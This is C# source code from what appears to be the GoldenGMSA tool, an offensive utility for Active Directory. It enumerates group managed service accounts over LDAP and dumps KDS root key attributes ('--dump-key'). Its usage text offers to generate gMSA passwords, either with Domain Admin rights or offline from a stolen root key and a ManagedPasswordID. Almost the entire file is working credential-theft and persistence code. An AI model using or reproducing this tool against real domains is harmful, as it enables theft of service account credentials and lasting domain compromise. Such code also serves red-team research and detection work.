using System;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace GoldengMSA
{
    public class Utils
    {

        [DllImport(@"kdscli.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern uint GenerateKDFContext(byte[] Guid, int ContextInit, long ContextInit2, long ContextInit3, int Flag, out IntPtr outContext, out int outContextSize, out int Flag2);

        [DllImport(@"kdscli.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern uint GenerateDerivedKey(string KDFAlgorithmID, byte[] KDFParam, int KDFParamSize, byte[] pbSecret, long cbSecret, byte[] Context, int ContextSize, ref int notSure, byte[] Label, int LabelSize, int notsureFlag, [MarshalAs(UnmanagedType.LPArray)] byte[] pbDerivedKey, int cbDerivedKey, int AlwaysZero);

        public static long[] GetIntervalId(long TimeStamp)
        {
            long KeyCycleDuration = 360000000000;
            int L1_KEY_ITERATION = 32;
            int L2_KEY_ITERATION = 32;
            long L0KeyID = (TimeStamp / KeyCycleDuration / L2_KEY_ITERATION / L1_KEY_ITERATION);
            long L1KeyID = (TimeStamp / KeyCycleDuration / L2_KEY_ITERATION) & (L1_KEY_ITERATION - 1);
            long L2KeyID = (TimeStamp / KeyCycleDuration) & (L2_KEY_ITERATION - 1);
            return new long[] { L0KeyID, L1KeyID, L2KeyID };

        }

        public static long GetKdsKeyCycleDuration()
        {
            return 360000000000;
        }

        public static void GetCurrentIntervalID(long KdsKeyCycleDuration, int SomeFlag, ref int L0KeyID, ref int L1KeyID, ref int L2KeyID)
        {
            long currentTime = DateTime.Now.ToFileTimeUtc();
            if (SomeFlag != 0)
            {
                currentTime += 3000000000;
            }
            int temp = (int)(currentTime / KdsKeyCycleDuration);
            L0KeyID = temp / 1024;
            L1KeyID = (temp / 32) & 31;
            L2KeyID = temp & 31;
            return;
        }

        public static void GetIntervalStartTime(long KdsKeyCycleDuration, int L0KeyID, int L1KeyID, int L2KeyID, ref long IntervalStartTime)
        {
            IntervalStartTime = KdsKeyCycleDuration * (L2KeyID + 32 * (L1KeyID + 32 * L0KeyID));
            return;
        }

        public static string GetDN()
        {
            DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://RootDSE");
            Object distinguishedName = RootDirEntry.Properties["defaultNamingContext"].Value;
            return distinguishedName.ToString();
        }

        public static string GetDomainName()
        {
            return System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
        }

        public static string GetForestName()
        {
            return System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Forest.Name;
        }

        public static void PrintManagedPasswordID (byte[] ManagedPasswordIDBytes)
        {
            Console.WriteLine(Convert.ToBase64String(ManagedPasswordIDBytes));
        }

        public static void PrintGroupKeyEnvelope(Group_Key_Envelope GKE)
        {
            Console.WriteLine(Convert.ToBase64String(GKE.Serialize()));
        }
        public static void PrintRootKey(Root_Key RootKey)
        {
            Console.WriteLine(Convert.ToBase64String(RootKey.Serialize()));
        }

        public static SearchResultCollection QueryLDAP(string filter, string[] attributes, string dn)
        {
            DirectoryEntry entry = new DirectoryEntry(dn);
            DirectorySearcher dSearch = new DirectorySearcher(entry, filter, attributes);
            SearchResultCollection result = dSearch.FindAll();            
            if (result == null)
            {
                throw new Exception("Could not find any result with filter: " + filter);
            }
            return result;
        }

        public static SearchResult GetGMSA(string SID)
        {
            string[] attributes = { "msds-ManagedPasswordID", "samAccountName", "objectSid" };
            string filter = String.Format("(&(objectCategory=msDS-GroupManagedServiceAccount)(objectsid={0}))", SID);
            SearchResult result = (Utils.QueryLDAP(filter, attributes, String.Format("LDAP://{0}", GetDomainName())))[0];
            return result;
        }

        public static byte[] GetManagedPasswordID(string SID)
        {
            return (byte[])GetGMSA(SID).Properties["msds-ManagedPasswordID"][0];
        }

        public static SearchResultCollection GetGMSAs ()
        {
            string[] attributes = { "msds-ManagedPasswordID", "samAccountName", "objectSid" };
            string filter = "objectCategory=msDS-GroupManagedServiceAccount";
            SearchResultCollection results = Utils.QueryLDAP(filter, attributes, String.Format("LDAP://{0}", GetDomainName()));
            return results;
        }

        public static void PrintGMSAInfo(SearchResult GMSA)
        {
            byte[] gMSASIDBytes = (byte[])GMSA.Properties["objectSid"][0];
            string gMSASID = (new SecurityIdentifier(gMSASIDBytes, 0)).ToString();

            Msds_ManagedPasswordID managedPasswordID = new Msds_ManagedPasswordID((byte[])GMSA.Properties["msds-ManagedPasswordID"][0]);
            Console.WriteLine(String.Format("SamAccountName: {0}\r\nObjectSID: {1}\r\nRootKeyGuid: {2}\r\n\r\nmsds-ManagedPasswordID:",
                GMSA.Properties["samAccountName"][0].ToString(), gMSASID, managedPasswordID.RootKeyIdentifier.ToString()));
            Console.WriteLine(Convert.ToBase64String((byte[])GMSA.Properties["msds-ManagedPasswordID"][0]));
            Console.WriteLine("\r\n----------------------------------------------\r\n");
        }

        public static void PrintGMSAsInfo()
        {
            SearchResultCollection gMSAs = Utils.GetGMSAs();
            foreach (SearchResult gMSA in gMSAs)
            {
                PrintGMSAInfo(gMSA);
            }
        }
        public static byte[] QueryManagedPasswordID(string SIDString)
        {
            string[] attributes = { "msds-ManagedPasswordID" };
            string filter = String.Format("(objectSID={0})", SIDString);
            SearchResult result = QueryLDAP(filter, attributes, String.Format("LDAP://{0}", GetDomainName()))[0];
            return (byte[])result.Properties["msds-ManagedPasswordID"][0];
        }

        public static SearchResult QueryRootKey(string RootKeyID)
        {

            string[] attributes = { "msKds-SecretAgreementParam", "msKds-RootKeyData", "msKds-KDFParam", "msKds-KDFAlgorithmID", "msKds-CreateTime", "msKds-UseStartTime",
                "msKds-Version", "msKds-DomainID", "cn", "msKds-PrivateKeyLength", "msKds-PublicKeyLength", "msKds-SecretAgreementAlgorithmID" };

            string fullDN = String.Format("LDAP://{0}/CN=Configuration,{1}", GetDomainName(), GetDN());
            string filter = String.Format("(&(objectClass=msKds-ProvRootKey)(cn={0}))", RootKeyID);

            return Utils.QueryLDAP(filter, attributes, fullDN)[0];
        }

        public static void ShowUsage()
        {
            string usage = @"GoldenGMSA usage:
----------------------------------------
Get basic information on all gMSAs in the domain (including GUID of associated KDS root key and msds-managedpasswordID):
GoldenGMSA --info

Get basic information on a specific gMSA based on the SID (including GUID of associated KDS root key and msds-managedpasswordID):
GoldenGMSA --info <gMSA SID>

Dump a specific KDS root key, specified by GUID in base64 format:
GoldenGMSA --dump-key <KDS Root Key GUID>

Generate a gMSA's password. Require Domain Admin privileges:
GoldenGMSA --generate-password --sid <gMSA SID>

Generate a gMSA's password. Require normal domain user and base64 of the relevant KDS root key:
GoldenGMSA --generate-password --sid <gMSA SID> --key <base64 RootKey>

Generate a gMSA's password. Offline mode - require base64 of the relevant KDS root key and an up to date base64 of msds-ManagedPasswordID:
GoldenGMSA --generate-password --sid <gMSA SID> --key <base64 RootKey> --passwordid <base64 ManagedPasswordID>";
            Console.WriteLine(usage);
        }

        public static void ParseArgs(string[] args)
        {
            Root_Key rootKey;
            Console.WriteLine();
            switch (args[0].ToLower())
            {
                case ("--info"):
                    if (args.Length > 2)
                    {
                        Utils.ShowUsage();
                        return;
                    }
                    if (args.Length == 2)
                    {
                        Utils.PrintGMSAInfo(Utils.GetGMSA(args[1]));
                    }
                    else
                    {
                        Utils.PrintGMSAsInfo();
                    }
                    return;
                case ("--generate-password"):
                    byte[] rootKeyBytes;
                    switch (args.Length)
                    {
                        case 3:
                            if (args[1].ToLower() != "--sid")
                            {
                                Utils.ShowUsage();
                                return;
                            }
                            Program.WriteGmsaPassword(args[2]);
                            break;
                        case 5:
                            if (args[1].ToLower() != "--sid" || args[3].ToLower() != "--key")
                            {
                                Utils.ShowUsage();
                                return;
                            }
                            rootKeyBytes = Convert.FromBase64String(args[4]);
                            rootKey = new Root_Key(rootKeyBytes);
                            Program.WriteGmsaPassword(args[2], rootKey);
                            break;
                        case 7:
                            if (args[1].ToLower() != "--sid" || args[3].ToLower() != "--key" || args[5].ToLower() != "--passwordid")
                            {
                                Utils.ShowUsage();
                                return;
                            }
                            rootKeyBytes = Convert.FromBase64String(args[4]);
                            rootKey = new Root_Key(rootKeyBytes);
                            byte[] managedPasswordIDBytes = Convert.FromBase64String(args[6]);
                            Program.WriteGmsaPassword(args[2], rootKey, managedPasswordIDBytes);
                            break;
                        default:
                            Utils.ShowUsage();
                            break;
                    }
                    break;
                case ("--dump-key"):
                    rootKey = new Root_Key(Utils.QueryRootKey(args[1]));
                    Utils.PrintRootKey(rootKey);
                    break;
                default:
                    Utils.ShowUsage();
                    return;

            }
        }
    }

    public class Root_Key
    {
        public int msKdsVersion { get; set; }
        public Guid cn { get; set; }
        public int ProbReserved { get; set; }
        public int msKdsVersion2 { get; set; }
        public int ProbReserved2 { get; set; }
        public string msKdsKDFAlgorithmID { get; set; }
        public byte[] msKdsKDFParam { get; set; }
        public int KDFParamSize { get; set; }
        public int ProbReserved3 { get; set; }
        public string KdsSecretAgreementAlgorithmID { get; set; }
        public byte[] KdsSecretAgreementParam { get; set; }
        public int SecretAlgoritmParamSize { get; set; }
        public int PrivateKeyLength { get; set; }
        public int PublicKeyLength { get; set; }
        public int ProbReserved4 { get; set; }
        public int ProbReserved5 { get; set; }
        public int ProbReserved6 { get; set; }
        public long flag { get; set; }
        public long flag2 { get; set; }
        public string KdsDomainID { get; set; }
        public long KdsCreateTime { get; set; }
        public long KdsUseStartTime { get; set; }
        public long ProbReserved7 { get; set; }
        public long KdsRootKeyDataSize { get; set; }
        public byte[] KdsRootKeyData { get; set; }

        public Root_Key(SearchResult result)
        {
            msKdsVersion = (int)result.Properties["msKds-Version"][0];
            cn = Guid.Parse(result.Properties["cn"][0].ToString());
            ProbReserved = 0;
            msKdsVersion2 = (int)result.Properties["msKds-Version"][0];
            ProbReserved2 = 0;
            msKdsKDFAlgorithmID = result.Properties["msKds-KDFAlgorithmID"][0].ToString();
            msKdsKDFParam = (byte[])result.Properties["msKds-KDFParam"][0];
            KDFParamSize = msKdsKDFParam.Length;
            ProbReserved3 = 0;
            KdsSecretAgreementAlgorithmID = result.Properties["msKds-SecretAgreementAlgorithmID"][0].ToString();
            KdsSecretAgreementParam = (byte[])result.Properties["msKds-SecretAgreementParam"][0];
            SecretAlgoritmParamSize = KdsSecretAgreementParam.Length;
            PrivateKeyLength = (int)result.Properties["msKds-PrivateKeyLength"][0];
            PublicKeyLength = (int)result.Properties["msKds-PublicKeyLength"][0];
            ProbReserved4 = 0;
            ProbReserved5 = 0;
            ProbReserved6 = 0;
            flag = 1;
            flag2 = 1;
            KdsDomainID = result.Properties["msKds-DomainID"][0].ToString();
            KdsCreateTime = (long)result.Properties["msKds-CreateTime"][0];
            KdsUseStartTime = (long)result.Properties["msKds-UseStartTime"][0];
            ProbReserved7 = 0;
            KdsRootKeyDataSize = 64;
            KdsRootKeyData = (byte[])result.Properties["msKds-RootKeyData"][0];
        }

        public Root_Key(string path)
        {
            string[] lines = File.ReadAllLines(path);
            msKdsVersion = Int32.Parse(lines[0]);
            cn = Guid.Parse(lines[1]);
            ProbReserved = 0;
            msKdsVersion2 = Int32.Parse(lines[0]);
            ProbReserved2 = 0;
            msKdsKDFAlgorithmID = lines[2];
            msKdsKDFParam = Convert.FromBase64String(lines[3]);
            KDFParamSize = msKdsKDFParam.Length;
            ProbReserved3 = 0;
            KdsSecretAgreementAlgorithmID = lines[4];
            KdsSecretAgreementParam = Convert.FromBase64String(lines[5]);
            SecretAlgoritmParamSize = KdsSecretAgreementParam.Length;
            PrivateKeyLength = Int32.Parse(lines[6]);
            PublicKeyLength = Int32.Parse(lines[7]);
            ProbReserved4 = 0;
            ProbReserved5 = 0;
            ProbReserved6 = 0;
            flag = 1;
            flag2 = 1;
            KdsDomainID = lines[8];
            KdsCreateTime = long.Parse(lines[9]);
            KdsUseStartTime = long.Parse(lines[10]);
            ProbReserved7 = 0;
            KdsRootKeyDataSize = 64;
            KdsRootKeyData = Convert.FromBase64String(lines[11]);
        }

        public Root_Key(byte[] RootKeyBytes)
        {
            int trackSize = 32;
            msKdsVersion = BitConverter.ToInt32(RootKeyBytes, 0);
            byte[] temp = new byte[16];
            Array.Copy(RootKeyBytes, 4, temp, 0, 16);
            cn = new Guid(temp);
            ProbReserved = BitConverter.ToInt32(RootKeyBytes, 20);
            msKdsVersion2 = BitConverter.ToInt32(RootKeyBytes, 24);
            ProbReserved2 = BitConverter.ToInt32(RootKeyBytes, 28);
            int msKdfAlgorithmIDSize = BitConverter.ToInt32(RootKeyBytes, trackSize);
            msKdsKDFAlgorithmID = System.Text.Encoding.Unicode.GetString(RootKeyBytes, trackSize + 4, msKdfAlgorithmIDSize);
            KDFParamSize = BitConverter.ToInt32(RootKeyBytes, trackSize + msKdfAlgorithmIDSize + 4);
            if (KDFParamSize > 0)
            {
                msKdsKDFParam = new byte[KDFParamSize];
                Array.Copy(RootKeyBytes, trackSize + msKdfAlgorithmIDSize + 8, msKdsKDFParam, 0, KDFParamSize);
            }
            else
            {
                msKdsKDFParam = null;
            }
            trackSize += msKdfAlgorithmIDSize + KDFParamSize + 8;

            ProbReserved3 = BitConverter.ToInt32(RootKeyBytes, trackSize);
            trackSize += 4;

            int kdsSecretAgreementAlgorithmIDSize = BitConverter.ToInt32(RootKeyBytes, trackSize);
            KdsSecretAgreementAlgorithmID = System.Text.Encoding.Unicode.GetString(RootKeyBytes, trackSize + 4, kdsSecretAgreementAlgorithmIDSize);
            SecretAlgoritmParamSize = BitConverter.ToInt32(RootKeyBytes, trackSize + kdsSecretAgreementAlgorithmIDSize + 4);
            if (SecretAlgoritmParamSize > 0)
            {
                KdsSecretAgreementParam = new byte[SecretAlgoritmParamSize];
                Array.Copy(RootKeyBytes, trackSize + msKdfAlgorithmIDSize + 8, KdsSecretAgreementParam, 0, SecretAlgoritmParamSize);
            }
            else
            {
                KdsSecretAgreementParam = null;
            }
            trackSize += kdsSecretAgreementAlgorithmIDSize + SecretAlgoritmParamSize + 8;
            
            PrivateKeyLength = BitConverter.ToInt32(RootKeyBytes, trackSize);
            PublicKeyLength = BitConverter.ToInt32(RootKeyBytes, trackSize + 4);
            ProbReserved4 = BitConverter.ToInt32(RootKeyBytes, trackSize + 8);
            ProbReserved5 = BitConverter.ToInt32(RootKeyBytes, trackSize + 12);
            ProbReserved6 = BitConverter.ToInt32(RootKeyBytes, trackSize + 16);
            flag = BitConverter.ToInt64(RootKeyBytes, trackSize + 20);
            flag2 = BitConverter.ToInt64(RootKeyBytes, trackSize + 28);
            trackSize += 36;

            int kdsDomainIDSize = BitConverter.ToInt32(RootKeyBytes, trackSize);
            KdsDomainID = System.Text.Encoding.Unicode.GetString(RootKeyBytes, trackSize + 4, kdsDomainIDSize);
            trackSize += kdsDomainIDSize + 4;

            KdsCreateTime = BitConverter.ToInt64(RootKeyBytes, trackSize);
            KdsUseStartTime = BitConverter.ToInt64(RootKeyBytes, trackSize + 8);
            ProbReserved7 = BitConverter.ToInt64(RootKeyBytes, trackSize + 16);
            KdsRootKeyDataSize = BitConverter.ToInt64(RootKeyBytes, trackSize + 24);
            if (KdsRootKeyDataSize > 0)
            {
                KdsRootKeyData = new byte[KdsRootKeyDataSize];
                Array.Copy(RootKeyBytes, trackSize + 32, KdsRootKeyData, 0, KdsRootKeyDataSize);
            }
            else
            {
                KdsRootKeyData = null;
            }
        }

        protected Root_Key(Root_Key RootKey)
        {
            this.msKdsVersion = RootKey.msKdsVersion;
            this.cn = RootKey.cn;
            this.ProbReserved = 0;
            this.msKdsVersion2 = RootKey.msKdsVersion;
            this.ProbReserved2 = 0;
            this.msKdsKDFAlgorithmID = RootKey.msKdsKDFAlgorithmID;
            this.msKdsKDFParam = RootKey.msKdsKDFParam.ToArray();
            this.KDFParamSize = RootKey.KDFParamSize;
            this.ProbReserved3 = RootKey.ProbReserved3;
            this.KdsSecretAgreementAlgorithmID = RootKey.KdsSecretAgreementAlgorithmID;
            this.KdsSecretAgreementParam = RootKey.KdsSecretAgreementParam.ToArray();
            this.SecretAlgoritmParamSize = RootKey.SecretAlgoritmParamSize;
            this.PrivateKeyLength = RootKey.PrivateKeyLength;
            this.PublicKeyLength = RootKey.PublicKeyLength;
            this.ProbReserved4 = RootKey.ProbReserved4;
            this.ProbReserved5 = RootKey.ProbReserved5;
            this.ProbReserved6 = RootKey.ProbReserved6;
            this.flag = RootKey.flag;
            this.flag2 = RootKey.flag2;
            this.KdsDomainID = RootKey.KdsDomainID;
            this.KdsCreateTime = RootKey.KdsCreateTime;
            this.KdsUseStartTime = RootKey.KdsUseStartTime;
            this.ProbReserved7 = RootKey.ProbReserved7;
            this.KdsRootKeyDataSize = RootKey.KdsRootKeyDataSize;
            this.KdsRootKeyData = RootKey.KdsRootKeyData;
        }

        public byte[] Serialize ()
        {
            int trackSize = 36;
            long rootKeySize = 124 + Encoding.Unicode.GetByteCount(msKdsKDFAlgorithmID) + msKdsKDFParam.Length + KdsSecretAgreementParam.Length
                + Encoding.Unicode.GetByteCount(KdsSecretAgreementAlgorithmID) + Encoding.Unicode.GetByteCount(KdsDomainID) + KdsRootKeyData.Length;
            byte[] rootKeyBytes = new byte[rootKeySize];
            BitConverter.GetBytes(msKdsVersion).CopyTo(rootKeyBytes, 0);
            cn.ToByteArray().CopyTo(rootKeyBytes, 4);
            BitConverter.GetBytes(ProbReserved).CopyTo(rootKeyBytes, 20);
            BitConverter.GetBytes(msKdsVersion2).CopyTo(rootKeyBytes, 24);
            BitConverter.GetBytes(ProbReserved2).CopyTo(rootKeyBytes, 28);

            byte[] msKdsKDFAlgorithmIDBytes = Encoding.Unicode.GetBytes(msKdsKDFAlgorithmID);
            BitConverter.GetBytes(msKdsKDFAlgorithmIDBytes.Length).CopyTo(rootKeyBytes, 32);
            msKdsKDFAlgorithmIDBytes.CopyTo(rootKeyBytes, trackSize);
            BitConverter.GetBytes(KDFParamSize).CopyTo(rootKeyBytes, trackSize + msKdsKDFAlgorithmIDBytes.Length);
            msKdsKDFParam.CopyTo(rootKeyBytes, trackSize + 4 + msKdsKDFAlgorithmIDBytes.Length);
            trackSize += msKdsKDFParam.Length + msKdsKDFAlgorithmIDBytes.Length + 4;

            BitConverter.GetBytes(ProbReserved3).CopyTo(rootKeyBytes, trackSize);
            trackSize += 4;

            byte[] kdsSecretAgreementAlgorithmIDBytes = Encoding.Unicode.GetBytes(KdsSecretAgreementAlgorithmID);
            BitConverter.GetBytes(kdsSecretAgreementAlgorithmIDBytes.Length).CopyTo(rootKeyBytes, trackSize);
            kdsSecretAgreementAlgorithmIDBytes.CopyTo(rootKeyBytes, trackSize + 4);
            BitConverter.GetBytes(SecretAlgoritmParamSize).CopyTo(rootKeyBytes, trackSize + 4 + Encoding.Unicode.GetByteCount(KdsSecretAgreementAlgorithmID));
            KdsSecretAgreementParam.CopyTo(rootKeyBytes, trackSize + Encoding.Unicode.GetByteCount(KdsSecretAgreementAlgorithmID) + 8);
            trackSize += KdsSecretAgreementParam.Length + Encoding.Unicode.GetByteCount(KdsSecretAgreementAlgorithmID) + 8;

            BitConverter.GetBytes(PrivateKeyLength).CopyTo(rootKeyBytes, trackSize);
            BitConverter.GetBytes(PublicKeyLength).CopyTo(rootKeyBytes, trackSize + 4);
            BitConverter.GetBytes(ProbReserved4).CopyTo(rootKeyBytes, trackSize + 8);
            BitConverter.GetBytes(ProbReserved5).CopyTo(rootKeyBytes, trackSize + 12);
            BitConverter.GetBytes(ProbReserved6).CopyTo(rootKeyBytes, trackSize + 16);
            BitConverter.GetBytes(flag).CopyTo(rootKeyBytes,trackSize + 20);
            BitConverter.GetBytes(flag2).CopyTo(rootKeyBytes, trackSize + 28);
            trackSize += 36;

            byte[] kdsDomainIDBytes = Encoding.Unicode.GetBytes(KdsDomainID);
            BitConverter.GetBytes(kdsDomainIDBytes.Length).CopyTo(rootKeyBytes, trackSize);
            kdsDomainIDBytes.CopyTo(rootKeyBytes, trackSize + 4);
            trackSize += Encoding.Unicode.GetByteCount(KdsDomainID) + 4;

            BitConverter.GetBytes(KdsCreateTime).CopyTo(rootKeyBytes, trackSize);
            BitConverter.GetBytes(KdsUseStartTime).CopyTo(rootKeyBytes, trackSize + 8);
            BitConverter.GetBytes(ProbReserved7).CopyTo(rootKeyBytes, trackSize + 16);
            BitConverter.GetBytes(KdsRootKeyDataSize).CopyTo(rootKeyBytes, trackSize + 24);
            KdsRootKeyData.CopyTo(rootKeyBytes, trackSize + 32);

            return rootKeyBytes;
        }
        public static void Export(SearchResult result, string path)
        {
            using (StreamWriter outputFile = new StreamWriter(path))
            {
                outputFile.WriteLine(result.Properties["msKds-Version"][0].ToString());
                outputFile.WriteLine(result.Properties["cn"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-KDFAlgorithmID"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-KDFParam"][0]));
                outputFile.WriteLine(result.Properties["msKds-SecretAgreementAlgorithmID"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-SecretAgreementParam"][0]));
                outputFile.WriteLine(result.Properties["msKds-PrivateKeyLength"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-PublicKeyLength"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-DomainID"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-CreateTime"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-UseStartTime"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-RootKeyData"][0]));
            }
        }
    }

    // This class comes from ComputeL0Key function inside KdsSvc.dll. it takes a Root_Key structure, adds a field in the begining (L0KeyID)
    // and modifies the KdsRootKeyData field with a value from GenerateDerivedKey. 
    public class L0_Key : Root_Key
    {
        public long L0KeyID { get; set; }
        public L0_Key(Root_Key RootKey, long L0KeyID, byte[] derivedKey)
         : base(RootKey)
        {
            this.L0KeyID = L0KeyID;
            this.KdsRootKeyData = derivedKey;
        }
    }

    public class Msds_ManagedPasswordID
    {
        public int Version { get; set; }
        public int Reserved { get; set; }
        public int isPublicKey { get; set; }
        public int L0Index { get; set; }
        public int L1Index { get; set; }
        public int L2Index { get; set; }
        public Guid RootKeyIdentifier { get; set; }
        public int cbUnknown { get; set; }
        public int cbDomainName { get; set; }
        public int cbForestName { get; set; }
        public byte[] Unknown { get; set; }
        public string DomainName { get; set; }
        public string ForestName { get; set; }

        public Msds_ManagedPasswordID(byte[] ManagedPasswordArr)
        {
            Version = BitConverter.ToInt32(ManagedPasswordArr, 0);
            Reserved = BitConverter.ToInt32(ManagedPasswordArr, 4);
            isPublicKey = BitConverter.ToInt32(ManagedPasswordArr, 8);
            L0Index = BitConverter.ToInt32(ManagedPasswordArr, 12);
            L1Index = BitConverter.ToInt32(ManagedPasswordArr, 16);
            L2Index = BitConverter.ToInt32(ManagedPasswordArr, 20);
            byte[] temp = new byte[16];
            Array.Copy(ManagedPasswordArr, 24, temp, 0, 16);
            RootKeyIdentifier = new Guid(temp);
            cbUnknown = BitConverter.ToInt32(ManagedPasswordArr, 40);
            cbDomainName = BitConverter.ToInt32(ManagedPasswordArr, 44);
            cbForestName = BitConverter.ToInt32(ManagedPasswordArr, 48);
            if (cbUnknown > 0)
            {
                Unknown = new byte[cbUnknown];
                Array.Copy(ManagedPasswordArr, 52, Unknown, 0, cbUnknown);
            }
            else
            {
                Unknown = null;
            }
            DomainName = System.Text.Encoding.Unicode.GetString(ManagedPasswordArr, 52 + cbUnknown, cbDomainName);
            ForestName = System.Text.Encoding.Unicode.GetString(ManagedPasswordArr, 52 + cbDomainName + cbUnknown, cbForestName);
        }
    }
}
